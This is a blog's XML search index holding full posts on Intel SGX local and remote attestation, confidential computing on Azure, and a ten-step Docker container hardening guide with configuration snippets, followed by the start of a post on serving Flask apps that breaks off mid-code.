<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Intel SGX Attestation Part 2</title>
      <link href="/Intel-SGX-Attestation-Part-2/"/>
      <url>/Intel-SGX-Attestation-Part-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Local-Attestation"><a href="#Local-Attestation" class="headerlink" title="Local Attestation"></a>Local Attestation</h2><p>After an SGX enclave has been instantiated on a platform, it may want to attest or prove that it is running on genuine SGX hardware. Before we talk about how it can prove this to remote parties, we will first discuss local attestation. Local attestation is when an enclave proves to another enclave on the same host that they are running on the same, genuine SGX hardware.</p><h3 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h3><p>You may be wondering why an enclave would care to attest itself to another enclave. Imagine the following scenario: Netflix is streaming videos to your computer. Netflix doesn’t want you to save their videos since they are copyright protected. But, they have to send you the video somehow so you can play it. How can they accomplish this?</p><p>If they send the video encrypted in an enclave binary, then you would not be able to view the raw video binary - only the CPU would be able to decode and play the video. But the enclave needs to first know if if it’s running on a genuine SGX platform. So, the enclave will want to attest itself with another enclave on your computer - maybe one written and signed by Intel for the sole purpose of verifying other enclaves. For this, we need a local attestation mechanism.</p><h3 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h3><p>Intel SGX introduced a new instruction called “EREPORT”. When invoked by an enclave, EREPORT asks the hardware to produce a signed structure called a report. The key used to sign is called the report key. The report key can only be requested from the hardware by the verifying enclave, so only the verifying enclave can properly verify the signature of this report. In other words, each enclave has a unique report key that only it can access, but other enclaves can still ask for reports signed by it.</p><p>The report contains the MRSIGNER, MRENCLAVE, some attributes associated with the enclave, and the hardware TCB*. The report also contains a small user-data field so the enclave author can include some miscellaneous data in the report. The user data must be passed to the EREPORT instruction as an argument.</p><p>Then, the source enclave takes this report and sends it to the verifying enclave. The verifying enclave first checks the signature on the report. To do this, it gets its report key via the EGETKEY instruction. If the report was signed properly, then the verifying enclave knows both enclaves are running on the same platform. Finally, the verifying enclave generates its own report and sends that report to the original enclave so the original enclave can verify it.</p><p>* Don’t worry about the meaning of hardware TCB for now. Just know it has something to do with the “security level” of the hardware.</p><h3 id="Establishing-a-Secure-Channel-between-Enclaves"><a href="#Establishing-a-Secure-Channel-between-Enclaves" class="headerlink" title="Establishing a Secure Channel between Enclaves"></a>Establishing a Secure Channel between Enclaves</h3><p>Let’s say the two enclaves wish to establish a secure channel with each other. This means they want to send each other encrypted messages, since they can’t trust the application hosting them to send the data unadultered. Establishing a secure channel requires them to exchange session keys which can be used to encrypt their messages.</p><p>They can do this using the report’s user data section. The user data section is only 256 bits long, so typically an application enclave will just hash the real data they want to pass and provide the hash in the report. Then, the application enclave will send both the report and the session key to the target enclave. The target enclave can verify that the hash of the attached user data matches the hash in the user data section of the report.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>To summarize, local attestation is performed through the following steps:</p><ol><li>Enclave A obtains enclave B’s MRENCLAVE value through some insecure path.</li><li>Enclave A generates some data which can be used to provision a secure channel (e.g. diffie hellman key).</li><li>Enclave A invokes EREPORT with two arguments: enclave B’s MRENCLAVE and a hash of the user data from the previous step. This tells the hardware to create a report and sign it using Enclave B’s report key. The hash of the user data should be in the user data field of the report.</li><li>Enclave A sends the signed report and user data to enclave B. This can happen over an untrusted channel.</li><li>Enclave B receives the report. First, it uses EGETKEY to retrieve its report key and recompute the MAC over the report. If it matches, then A really is an enclave running on the same platform as B, in an environment that abides by Intel SGX’s security model.</li><li>Enclave B verifies that the user data was properly received by checking the hash in the report against the hash of the user data received.</li><li>Enclave B creates a report for A by using the MRENCLAVE from the report it just received. It may attach its own user data for key exchange.</li><li>Enclave B transmits its report to A, and A verifies the report + user data.</li><li>Now, both enclaves can use their new session key generated from the user data to exchange encrypted information.</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Swami-SGX-Remote-Attestation-Is-Not-Sufficient-wp.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Swami-SGX-Remote-Attestation-Is-Not-Sufficient-wp.pdf</a></p></li><li><p><a href="https://software.intel.com/content/www/us/en/develop/articles/innovative-technology-for-cpu-based-attestation-and-sealing.html">https://software.intel.com/content/www/us/en/develop/articles/innovative-technology-for-cpu-based-attestation-and-sealing.html</a></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Intel SGX Attestation Part 1</title>
      <link href="/Intel-SGX-Attestation-Part-1/"/>
      <url>/Intel-SGX-Attestation-Part-1/</url>
      
        <content type="html"><![CDATA[<h2 id="What-is-Remote-Attestation"><a href="#What-is-Remote-Attestation" class="headerlink" title="What is Remote Attestation?"></a>What is Remote Attestation?</h2><p>Intel SGX is a set of processor extensions for establishing enclaves. Enclaves are trusted execution environments whose code and data cannot be accessed outside the enclave - even by the application that created it or by the operating system. An attacker that wishes to inspect the contents of an enclave may try to emulate the hardware. The process of proving that the enclave has been established in a secure hardware environment is known as attestation. In the cloud, remote attestation gives enclave authors the ability to remotely verify that their code is running on genuine, secure SGX hardware.</p><p>Note: the term “enclave” is used to denote both a signed binary file as well as the encrypted memory where the binary is loaded at runtime. To disambiguate, I will refer to the binary as the enclave binary and to the encrypted memory as the enclave.</p><h2 id="Secure-Enclave-Instantiation"><a href="#Secure-Enclave-Instantiation" class="headerlink" title="Secure Enclave Instantiation"></a>Secure Enclave Instantiation</h2><p>It would be meaningless for an enclave to perform attestation if the code in the enclave could be modified by an attacker. So before we can understand how remote attestation works, we must first understand how the processor securely loads enclave binaries into memory.</p><p>To do this, we introduce two properties of an enclave: the MRENCLAVE and MRSIGNER. These are two registers introduced by the SGX architecture and are set by the hardware when an enclave is instantiated.</p><ul><li><p><strong>MRENCLAVE</strong> - Represents the enclave identity. Contains the SHA256 hash of an internal log that records all the activity during enclave instantiation. This includes the contents of the enclave memory pages (code&#x2F;data&#x2F;stack&#x2F;heap), the order and relative position in which the enclave’s pages were placed, and any security flags associated with the pages. The MRENCLAVE value is also known as the enclave <em>measurement</em>.</p></li><li><p><strong>MRSIGNER</strong> - Represents the sealing identity. An enclave author must sign their enclave binary with an RSA private key. The MRSIGNER is a hash of the corresponding public key certificate (typically self-signed).</p></li></ul><h3 id="Why-are-these-registers-important"><a href="#Why-are-these-registers-important" class="headerlink" title="Why are these registers important?"></a>Why are these registers important?</h3><p>The MRENCLAVE is like a hash of all the memory pages, data, and security flags of the freshly loaded enclave memory. If this value can somehow be verified, then the enclave can at least be sure its code and data were not tampered.</p><p>The MRSIGNER provides a way to authenticate the enclave. If multiple enclaves are signed by the same enclave author, they will have the same MRSIGNER. The Sealing Identity can be used to seal data in a way that enclaves from the same Sealing Authority can share and migrate their sealed data.</p><h3 id="How-are-these-registers-set"><a href="#How-are-these-registers-set" class="headerlink" title="How are these registers set?"></a>How are these registers set?</h3><p>A part of the enclave binary is a structure called the MRSIGN struct. It contains the expected MRENCLAVE value, the RSA public key of the enclave author, and a signature over the whole enclave binary.</p><p>Before an enclave is instantiated, the author’s identity is first verified using the public key. If the public key verifies the signature over the enclave, we know that the self-signed certificate containing the public key really does represent the enclave author.</p><p>Then, the MRENCLAVE value from the struct is copied to the MRENCLAVE register. The CPU begins loading pages into memory and setting security flags on those pages. As it does this, it keeps a log of what data is being loaded and set. At the end, this log is hashed and compared with the MRENCLAVE in the register. If they match, then the CPU knows that the enclave binary was not tampered with and can safely begin executing enclave code.</p><p>Finally, the MRSIGNER is stored in the MRSIGNER register. It is simply a hash of the enclave author’s public key. Now, both the MRENCLAVE and MRSIGNER are available for use within the enclave for sealing data and attestation. Naturally, only the CPU can write to these registers - they cannot be overwritten after enclave instantiation.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><p><a href="https://software.intel.com/content/www/us/en/develop/articles/innovative-technology-for-cpu-based-attestation-and-sealing.html">https://software.intel.com/content/www/us/en/develop/articles/innovative-technology-for-cpu-based-attestation-and-sealing.html</a></p></li><li><p><a href="https://community.intel.com/t5/Intel-Software-Guard-Extensions/Question-about-MRENCLAVE-and-MRSIGNER-Register-used-in/m-p/1070695/highlight/true">https://community.intel.com/t5/Intel-Software-Guard-Extensions/Question-about-MRENCLAVE-and-MRSIGNER-Register-used-in/m-p/1070695/highlight/true</a></p></li><li><p><a href="https://software.intel.com/content/www/us/en/develop/download/intel-sgx-intel-epid-provisioning-and-attestation-services.html">https://software.intel.com/content/www/us/en/develop/download/intel-sgx-intel-epid-provisioning-and-attestation-services.html</a></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Confidential Computing</title>
      <link href="/Confidential-Computing/"/>
      <url>/Confidential-Computing/</url>
      
        <content type="html"><![CDATA[<p>Cloud vendors provide compute power as a utility. This is great for organizations since they can cut costs by taking advantage of economies of scale and offloading datacenter management to a third party. That third party will do a much better job maintaining and securing their machines since that is the core of their business. Most cloud providors even provide SLAs which guarantee certain security and availability requirements are met.</p><p>However, for some customers, even the strongest of SLAs is not enough to convince them to move to the cloud. These organizations, typically in government, healthcare, or finance, are legally obligated to take extra precautions when processing data. That’s because the data they possess is too sensitive to be accidentally leaked, even just once. A cloud environment faces many threats that they have no control over. What if a malicious actor gains root access to a cloud VM? Or a disgruntled employee at the cloud company decides to install spyware on all the servers? There is very little that the customer can do about these threats since they operate within the typical “trust” boundary - we usually trust that our OS and cloud provider are not intentionally sabotaging us.</p><p>Enter confidential computing. With new processor technologies like Intel SGX, application developers can write code that only trusts the processor running their code. These technologies typically encrypt code and data in secure regions of memory called enclaves. Only a genuine processor can decrypt these enclaves and execute the code inside them. Code from outside the enclave cannot modify or even view its contents - even if that code belongs to the OS. This enables sensitive customers to leverage the cloud since they don’t even need to trust the cloud provider to run their code properly or safeguard their data.</p><p>To prevent an adversary from simply simulating a processor enclave, these technologies come with ways for code within enclaves to attest that they are running on real, secure hardware. An enclave should only continue executing business logic if this attestation succeeds. Typically, this attestation utilizes public key infrastructure (PKI) to cryptographically verify that the sensitive code is running on a genuine platform. Attestation requires public keys embedded in certificates signed by the processor vendor, made available through a web API provided by the vendor.</p><p>In Microsoft Azure, the Trusted Hardware Identity Management (THIM) service caches these certificates and other attestation collateral so that Azure can reduce runtime dependencies on third party processor manufacture APIs. Additionally, by serving collateral themselves, Azure can can also schedule security update enforcement at their own pace. In this series of blog posts, I will attempt to explain my understanding of how Intel SGX attestation works and what role the THIM service plays in Azure. Please feel free to leave a comment if you notice anything incorrect! I’m still new in this area and expect a few mistakes here and there.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>10 Simple Steps to Harden Your Docker Containers</title>
      <link href="/10-Simple-Steps-to-Harden-Docker-Containers/"/>
      <url>/10-Simple-Steps-to-Harden-Docker-Containers/</url>
      
        <content type="html"><![CDATA[<p>Docker is a well tested containerization platform that is used by hundreds of companies to securely and scalably deploy applications. Today, I’ll explain some of the basic steps you can take to secure your containers so that if an application gets popped, you can minimize the impact on other containers on the same host and the host itself. Many of the practices listed here are just my notes from <a href="https://snyk.io/blog/10-docker-image-security-best-practices/">this snyk blog post</a> and <a href="https://www.secjuice.com/how-to-harden-docker-containers/">this secjuice article</a>, so please give their pages a look for more details!</p><h2 id="1-Create-a-Less-Privileged-User"><a href="#1-Create-a-Less-Privileged-User" class="headerlink" title="1. Create a Less Privileged User"></a>1. Create a Less Privileged User</h2><p>By default, your app runs as root inside the container. You can create a special group and user and then change to that user before launching your app. That way, your attacker doesn’t get root access by default!</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> addgroup -S app_group &amp;&amp; adduser -S --shell /sbin/nologin -g app_group app_user</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R app_user:app_group /app</span></span><br><span class="line"><span class="keyword">USER</span> app_user</span><br></pre></td></tr></table></figure><h2 id="2-Use-an-Alpine-Base-Image"><a href="#2-Use-an-Alpine-Base-Image" class="headerlink" title="2. Use an Alpine Base Image"></a>2. Use an Alpine Base Image</h2><p>If an attacker compromises your app, they may wish to pivot around the system and escalate their privileges. This is facilitated by the other programs residing in the container that may have vulnerabilities themselves. One of the first things an attacker will do is check what processes are running on the system, which processes are running as root, and what suid binaries are installed on the system. For example, the Morris Worm exploited a buffer overflow in the <a href="http://seclab.cs.ucdavis.edu/projects/vulnerabilities/doves/1.html"><code>finger</code> daemon</a> to get a root shell on the victim, since the daemon often ran as superuser.</p><p>The potential for escalation can be significantly reduced by just stripping out all the unnecessary programs in your base image as this decreases the available attack surface. Fortunately, there are already pre-built Docker images that take care of this for you: the Alpine images. Alpine images are based on BusyBox and only contain the essential files needed for your app. If you need a container for nginx, for example, you can specify a container like the following:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx:alpine</span><br></pre></td></tr></table></figure><p>Want to run a Python application? Easy:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine</span><br></pre></td></tr></table></figure><p>The image will be stripped down but will still have the bare minimum needed to run a Python application. You won’t find programs that should never get run (like vim or netcat) inside an Alpine image. Finally, one last benefit of the Alpine image is that your resulting image will be a lot smaller! The whole image might only take up a few megabytes of space, compared to over a gigabyte if you use a Debian or Ubuntu image.</p><h2 id="3-Namespace-Isolation-on-the-Docker-Host"><a href="#3-Namespace-Isolation-on-the-Docker-Host" class="headerlink" title="3. Namespace Isolation on the Docker Host"></a>3. Namespace Isolation on the Docker Host</h2><p>By default, the root namespace in your Docker container maps 1:1 with the host. What this means is that if an attacker gets root in a container and then breaks out of the container, they’ll also have root access on the Docker host. This can easily be mitigated by re-mapping the Docker <code>root</code> to a less privileged user on the host. The <a href="https://docs.docker.com/engine/security/userns-remap/">Docker docs</a> have a great explanation with more details; here I just list what I think are the easiest ways to apply this.</p><p>First, set Docker to use a configuration file (if not already). Edit <code>/etc/default/docker</code> and add:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">DOCKER_OPTS</span>=<span class="string">&quot;--config-file=/etc/docker/daemon.json&quot;</span></span><br></pre></td></tr></table></figure><p>Then, create or edit <code>/etc/docker/daemon.json</code> and add the <code>userns-remap</code> option to the config:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;userns-remap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>With the “default” remap option set, Docker will look for the <code>dockremap</code> subuid and subgid to perform any remappings. Now, we’ll add “dockremap” user and group entries for subuid&#x2F;subgid.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;dockremap:345000:65536&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/subuid</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;dockremap:345000:65536&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/subgid</span></span><br></pre></td></tr></table></figure><p>I chose the UID&#x2F;GID ranges you see above (345000-65536) but you’re free to choose anything that doesn’t conflict with another existing mapping. Finally, restart your Docker daemon to apply the changes.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="4-Use-dockerignore"><a href="#4-Use-dockerignore" class="headerlink" title="4. Use .dockerignore"></a>4. Use .dockerignore</h2><p>Sometimes, I’ll find myself issuing a command like <code>COPY . .</code> in a Dockerfile. You want to be careful whenever you copy a full folder’s contents into your image. Make sure you don’t copy local build files like <code>__pycache__</code> and <code>venv</code>, or secret files like <code>.env</code> or <code>creds.json</code>. You can use a <code>.dockerignore</code> file to explicitly blacklist or whitelist certain file types. I would recommend using whitelisting so that you’re always aware of exactly what files are going into your container. Better yet would be to avoid blind full directory copies like <code>COPY . .</code> altogether, but since that can be difficult for larger projects, a <code>.dockerignore</code> file might be more practical.</p><h2 id="5-Use-Dockerfile-Security-Linters-Scanners"><a href="#5-Use-Dockerfile-Security-Linters-Scanners" class="headerlink" title="5. Use Dockerfile Security Linters &amp; Scanners"></a>5. Use Dockerfile Security Linters &amp; Scanners</h2><p>A linter is an automatic way to provide immediate feedback on  best practices and could catch simple security issues in your Dockerfile. One that I’ve used in the past is <a href="https://github.com/hadolint/hadolint">hadolint</a>, which integrates into my text editor (VSCode) nicely. There are lots of tools that automatically scan your images for known CVEs. If you have any good suggestions that you’ve used in the past, please let me know in the comments!</p><h2 id="6-Explicitly-supply-IP-Addresses-for-Exposed-Ports"><a href="#6-Explicitly-supply-IP-Addresses-for-Exposed-Ports" class="headerlink" title="6. Explicitly supply IP Addresses for Exposed Ports"></a>6. Explicitly supply IP Addresses for Exposed Ports</h2><p>In a docker-compose file, you can use the <code>ports</code> command to map container ports to ports on the host like the following:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br></pre></td></tr></table></figure><p>By default, this makes port 80 on the host’s public IP address available for use. If you’re just developing locally, you should explicitly define the IP that gets mapped so that others can’t access your dev environment.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:80:80</span></span><br></pre></td></tr></table></figure><h2 id="7-Use-Control-Groups-cgroups"><a href="#7-Use-Control-Groups-cgroups" class="headerlink" title="7. Use Control Groups (cgroups)"></a>7. Use Control Groups (cgroups)</h2><p>The Linux kernel allows you to limit access to physical hardware resources (eg the CPU, RAM, network, etc). This can be important if you don’t want one container to monopolize the resources on the host, such as in a DOS attack. There are many things you could restrict, but here are some of the basic things.</p><figure class="highlight bash"><figcaption><span>Restrict app to Certain CPU Cores</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Restrict app to only use cores 0-1</span></span><br><span class="line">docker run --cpuset-cpus 0-1 my_image</span><br><span class="line"><span class="comment"># Restrict app to only use cores 0 and 2</span></span><br><span class="line">docker run --cpuset-cpus 0,2 my_image</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>Specify Time Allocation per Container</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cpu-shares 512</span><br></pre></td></tr></table></figure><p>The <code>--cpu-shares</code> flag takes a value from 0-1024 and uses a relative weighting scheme. For example:<br>    - Container 1 has 1024 shares, Containers 2 and 3 have 512 shares each.<br>    - Then Container 1 has 50% of the CPU time, the other 2 have 25% each.</p><p>Shares are only enforced when CPU time is running, not I&#x2F;O wait time. This is because other containers can use the CPU during that time anyway.</p><figure class="highlight bash"><figcaption><span>Prevent Fork Bombs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --pids-limit 200 my_image</span><br></pre></td></tr></table></figure><p>This limits the number of processes a container can fork at runtime, which prevents fork bombs from consuming a Docker Hosts’ entire process table.</p><h2 id="8-Make-Container-Read-Only"><a href="#8-Make-Container-Read-Only" class="headerlink" title="8. Make Container Read-Only"></a>8. Make Container Read-Only</h2><p>Ideally, your app’s container should be stateless so writes aren’t really necessary. Any “writes” should happen in a separate database container. Practically, though, many programs rely on the ability to write files to <code>/tmp</code> or other files during their runtime, and they may throw errors if you try to make the whole container read-only. One way around this is to use the <code>--tmpfs</code> flag to create writeable directories for whatever you need. See <a href="https://nickjanetakis.com/blog/docker-tip-55-creating-read-only-containers">here</a> for more details and the <a href="#Sample-docker-compose">compose file</a> at the bottom of the page for an example.</p><h2 id="9-Network-Isolation"><a href="#9-Network-Isolation" class="headerlink" title="9. Network Isolation"></a>9. Network Isolation</h2><p>If you use <code>docker-compose</code>, you can specify networking namespaces to isolate the different containers that comprise your application. For example: Let’s say you have 1 container for your app logic and 2 containers for different databases.</p><p>You want the different databases to talk to the application, but you don’t want the databases to talk to each other. If one of the DB containers gets compromised, it at least shouldn’t be able to mess with the other DB container. You can use network namespaces to implement this in your docker compose file. Here’s a simple example where the databases can’t talk to each other, but they can talk to the app.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">app:</span></span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">dbA</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">dbB</span></span><br><span class="line">    <span class="attr">databaseA:</span></span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">dbA</span></span><br><span class="line">    <span class="attr">databaseB:</span></span><br><span class="line">        <span class="attr">networks:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">dbB</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">dbA:</span></span><br><span class="line">  <span class="attr">dbB:</span></span><br></pre></td></tr></table></figure><h2 id="10-Set-up-AppArmor-Seccomp-Rules-and-Capabilities"><a href="#10-Set-up-AppArmor-Seccomp-Rules-and-Capabilities" class="headerlink" title="10. Set up AppArmor, Seccomp Rules, and Capabilities"></a>10. Set up AppArmor, Seccomp Rules, and Capabilities</h2><p>Linux provides extremely fine-grained controls to OS resources. AppArmor, Seccomp, and Capabilities are ways to  minimize the resources available to an attacker of your app both during and after the exploitation process. This may be overkill depending on your app’s functionality and your threat model - they’re probably more relevant to those who wish to build a sandbox to run untrusted code, but I list these here for completeness. <a href="https://security.stackexchange.com/questions/196881/docker-when-to-use-apparmor-vs-seccomp-vs-cap-drop">Here</a> is an excellent set of explanations from the security stack exchange on the differences between the three.</p><ol><li><p>AppArmor is a kernel security module that allows you to restrict or remove fine-grained access to specific operations. For example, you can explicitly deny your app from ever reading files from <code>/etc/</code>. Even if an attacker can execute arbitrary code via your app, they’ll never be able to perform a read on anything in <code>/etc/</code> if you configure your AppArmor rules as such. You can also restrict things like network and socket access to only talk to pre-specified hosts.</p></li><li><p>Seccomp is short for “secure computing mode” and is another Linux security feature. You can use seccomp to remove the ability of a program to use certain syscalls that aren’t needed. A common exploitation technique is to use syscalls with attacker-specified arguments to perform reads and writes in memory. With the right seccomp rules in place, an attacker will have an extremely difficult time manipulating the program’s memory to build a reliable exploit.</p></li><li><p>Capabilities are individual privileges of the root user that are provided by the Linux kernel. A root process can drop capabilities so that it’s never able to do something it shouldn’t, such as creating raw connections to the network.</p></li></ol><h2 id="Sample-docker-compose"><a href="#Sample-docker-compose" class="headerlink" title="Sample docker-compose"></a>Sample docker-compose</h2><p>I’ve implemented some of the above protections in the below docker-compose file. I’ve specified a web app that uses nginx to field requests, a Flask web server that processes the requests, and a separate image for a job called “dirsearch”. The “dirsearch” job only talks to nginx via the <code>frontend</code> network. The nginx container talks to the flask webapp via the <code>backend</code> network. Finally, the flask container is <code>read_only</code>, except for the <code>/tmp</code> directory.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">flask:</span> <span class="comment"># Creates a virtual hostname &quot;flask&quot; available to nginx container too!</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">webapp-flask</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">flask_server</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">app_container/Dockerfile</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line">    <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tmpfs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/tmp</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">webapp-nginx</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">flask_server</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">nginx_container/Dockerfile</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">flask</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backend</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:80:80</span> <span class="comment"># Map port 80 on host to port 80 on nginx container (so http://localhost works on host)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dirsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">dirsearch</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">dirsearch_job</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frontend</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:5000:5000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">frontend:</span></span><br><span class="line">  <span class="attr">backend:</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Hardening </tag>
            
            <tag> Secure </tag>
            
            <tag> Containers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Serving a Flask Application</title>
      <link href="/Serving-Flask/"/>
      <url>/Serving-Flask/</url>
      
        <content type="html"><![CDATA[<p>Sometime during my undergrad, I wrote a simple Flask app that had tons of intentional security vulnerabilities. I served the app from my laptop at a security club meeting as a challenge to see who could find all the vulns first. Students connected to my laptop, interacted with login forms, and played around with my website. About 10 minutes in, everyone started reporting that the server was taking too long to respond. I visited the homepage of the app and confirmed that it was taking around ~3 minutes to load. At the time, I thought maybe my laptop couldn’t handle the 20-40 people in the room connecting simultaneously, and that I should have gotten a dedicated server. Thinking back, though, that couldn’t have been the case. My laptop had an above average 8-core Intel i7 CPU, 16GB of RAM, and an SSD. It also wasn’t running much software other than the web server. So what was the issue?</p><p>There are plenty of <a href="https://www.freecodecamp.org/news/how-to-build-a-web-application-using-flask-and-deploy-it-to-the-cloud-3551c985e492/">tutorials</a> on how to build basic web apps using Flask. However, most of them stop short at letting you use Flask’s debug web server to serve your application. In a production environment, like my security club room, you’d never want to serve an app this way. Today, I’ll introduce some of the software used to serve a Flask application and how they fit together. Using this information, you can create an app that serves thousands of clients from just your laptop!</p><h2 id="Flask-Application"><a href="#Flask-Application" class="headerlink" title="Flask Application"></a>Flask Application</h2><p>Very briefly, I’ll introduce the basics of a Flask application. First, we start by creating an application object.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 